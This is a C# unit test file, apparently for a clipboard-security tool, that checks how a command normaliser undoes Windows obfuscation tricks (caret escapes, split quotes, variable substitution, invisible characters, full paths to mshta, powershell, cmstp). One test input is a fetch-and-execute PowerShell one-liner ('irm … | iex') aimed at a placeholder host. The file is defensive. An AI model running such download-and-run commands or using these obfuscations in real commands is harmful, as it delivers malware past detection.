using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

// 程式名稱用片段組合（docs/detection-rules.md §8），避免測試檔本身被防毒當成惡意樣本。
public class CommandNormalizerTests
{
    private static readonly string Hta = string.Concat("ms", "hta");
    private static readonly string Ps = string.Concat("power", "shell");
    private static readonly string Pwsh = string.Concat("pw", "sh");

    [Fact]
    public void 各種dash變體換成連字號()
    {
        Assert.Equal("----------", CommandNormalizer.Normalize("\u2010\u2011\u2012\u2013\u2014\u2015\u2212\uFE58\uFE63\uFF0D"));
    }

    [Fact]
    public void 去掉cmd的插入號跳脫()
    {
        Assert.Equal(Hta, CommandNormalizer.Normalize("m^s^h^t^a"));
        Assert.Equal("a^b", CommandNormalizer.Normalize("a^^b"));
        Assert.Equal(Hta, CommandNormalizer.Normalize("ms^\r\nhta"));   // 行尾 ^ 接下一行
    }

    [Theory]
    [InlineData("\"m\"sh\"ta\"")]
    [InlineData("ms\"\"hta")]
    [InlineData("\"ms\"hta")]
    [InlineData("m\"sht\"a")]
    public void 合併用引號拆開的字(string split)
    {
        Assert.Equal(Hta, CommandNormalizer.Normalize(split));
    }

    [Fact]
    public void 代入set設定的變數()
    {
        Assert.Equal($"set x={Hta}&& call {Hta} u", CommandNormalizer.Normalize($"set x={Hta}&& call %x% u"));
        Assert.Equal($"set \"x={Hta}\" & call {Hta} u", CommandNormalizer.Normalize($"set \"x={Hta}\" & call %X% u"));
        Assert.Equal($"set x=ms&set y=hta&call {Hta} u", CommandNormalizer.Normalize("set x=ms&set y=hta&call %x%%y% u"));
    }

    // 看不見的字元一律用 code point 在執行時產生，原始碼裡不放字面字元。
    public static TheoryData<int> InvisibleCodePoints() =>
    [
        0x00AD, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x180E,
        0x115F, 0x1160, 0x3164, 0xFFA0, 0xE0000, 0xE0001, 0xE0041, 0xE007F,
    ];

    [Theory]
    [MemberData(nameof(InvisibleCodePoints))]
    public void 拿掉看不見的字元(int codePoint)
    {
        var c = char.ConvertFromUtf32(codePoint);
        Assert.Equal(Hta, CommandNormalizer.Normalize("ms" + c + "h" + c + c + "ta"));
        Assert.Equal(Ps, CommandNormalizer.Normalize(c + "pow" + c + "ershell" + c));
    }

    [Fact]
    public void TAG區塊外的代理字元對保留()
    {
        var emoji = char.ConvertFromUtf32(0x1F600);       // 一般 emoji 不受影響
        var beyondTag = char.ConvertFromUtf32(0xE0080);   // TAG 區塊之後的字元不拿掉
        Assert.Equal("a" + emoji + "b", CommandNormalizer.Normalize("a" + emoji + "b"));
        Assert.Equal("a" + beyondTag + "b", CommandNormalizer.Normalize("a" + beyondTag + "b"));
    }

    [Fact]
    public void 代入延遲展開的變數()
    {
        Assert.Equal($"set a=ms&& set b=hta&& call {Hta} u", CommandNormalizer.Normalize("set a=ms&& set b=hta&& call !a!!b! u"));
        // cmd /v:on /c "set x=…" 的 set 前面是引號。
        Assert.Equal($"cmd /v:on /c \"set x={Hta}&& {Hta} u\"", CommandNormalizer.Normalize($"cmd /v:on /c \"set x={Hta}&& !x! u\""));
        // 沒設定過的變數、句子裡的驚嘆號不動。
        Assert.Equal("Hello!World! Wow!", CommandNormalizer.Normalize("Hello!World! Wow!"));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\wscript.exe a.vbs", "wscript a.vbs")]
    [InlineData(@"""C:\Windows\System32\cscript.exe"" a.js", "cscript a.js")]
    [InlineData(@"C:\Windows\hh.exe a.chm", "hh a.chm")]
    [InlineData(@"%windir%\System32\cmstp.exe /au a.inf", "cmstp /au a.inf")]
    [InlineData(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe a.dll", "InstallUtil a.dll")]
    [InlineData(@"C:\Windows\explorer.exe x", "explorer x")]
    [InlineData(@"C:\Windows\System32\net.exe use x", "net use x")]
    public void 新增的程式也縮短完整路徑(string text, string expected)
    {
        Assert.Equal(expected, CommandNormalizer.Normalize(text));
    }

    [Fact]
    public void 變數代入有上限()
    {
        var text = "set a=" + new string('x', 1000) + "&" + string.Concat(Enumerable.Repeat("%a%", 1000));
        Assert.True(CommandNormalizer.Normalize(text).Length < 70_000);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\{0}.exe u", "{0} u")]
    [InlineData(@"c:\windows\syswow64\{0} u", "{0} u")]
    [InlineData(@"""C:\Windows\System32\{0}.exe"" u", "{0} u")]
    [InlineData(@"%SystemRoot%\System32\{0}.exe u", "{0} u")]
    [InlineData(@"%windir%\SysWOW64\{0}.exe u", "{0} u")]
    [InlineData(@"""%windir%\System32\{0}.exe"" u", "{0} u")]
    [InlineData(@"C:/Windows/System32/{0}.exe u", "{0} u")]
    [InlineData(@"\\host\share\{0}.exe u", "{0} u")]
    [InlineData(@"start """" ""{0}"" u", @"start """" {0} u")]
    public void 完整路徑只留程式名稱(string format, string expected)
    {
        Assert.Equal(string.Format(expected, Hta), CommandNormalizer.Normalize(string.Format(format, Hta)));
    }

    [Fact]
    public void PowerShell的各種路徑()
    {
        Assert.Equal($"{Ps} -c x", CommandNormalizer.Normalize($@"C:\Windows\System32\WindowsPowerShell\v1.0\{Ps}.exe -c x"));
        Assert.Equal($"{Ps} -c x", CommandNormalizer.Normalize($@"$env:windir\SysWOW64\WindowsPowerShell\v1.0\{Ps}.exe -c x"));
        Assert.Equal($"{Pwsh} -c x", CommandNormalizer.Normalize($@"""C:\Program Files\PowerShell\7\{Pwsh}.exe"" -c x"));
        Assert.Equal($"{Pwsh} -c x", CommandNormalizer.Normalize($@"""%ProgramFiles%\PowerShell\7\{Pwsh}.exe"" -c x"));
        Assert.Equal("cmd /c x", CommandNormalizer.Normalize("%ComSpec% /c x"));
    }

    // 不該被改動的文字：一般路徑、網址、字串參數、未知變數。
    [Theory]
    [InlineData(@"C:\x\a.ps1")]
    [InlineData(@"C:\Windows\System32\")]
    [InlineData("github.com/powershell/powershell")]
    [InlineData("https://example.invalid/tools/mshta.exe")]
    [InlineData(@"powershell -c ""irm https://example.invalid | iex""")]
    [InlineData("%UNKNOWN%")]
    [InlineData("echo \"hello\" world")]
    [InlineData("明天下午三點開會")]
    public void 其他文字保持原樣(string text)
    {
        Assert.Equal(text, CommandNormalizer.Normalize(text));
    }

    [Fact]
    public void 字串參數裡的路徑只縮短路徑本身()
    {
        // 加引號的路徑規則不能把整段 -c "…" 吃掉，只有裡面那個路徑會縮成檔名。
        Assert.Equal(@"x -c ""Get-Item cmd""", CommandNormalizer.Normalize(@"x -c ""Get-Item C:\x\cmd"""));
    }

    [Fact]
    public void 空字串()
    {
        Assert.Equal("", CommandNormalizer.Normalize(null));
        Assert.Equal("", CommandNormalizer.Normalize(""));
    }
}
